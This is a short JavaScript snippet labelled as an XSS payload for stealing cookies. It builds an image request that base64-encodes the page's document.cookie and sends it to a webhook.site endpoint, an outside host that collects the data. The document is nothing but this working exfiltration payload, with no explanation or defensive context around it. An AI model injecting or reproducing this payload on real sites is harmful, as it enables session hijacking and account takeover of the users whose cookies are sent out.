// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/5e2ea736-265d-4022-9edb-df56b111df12?data=' + btoa(document.cookie);
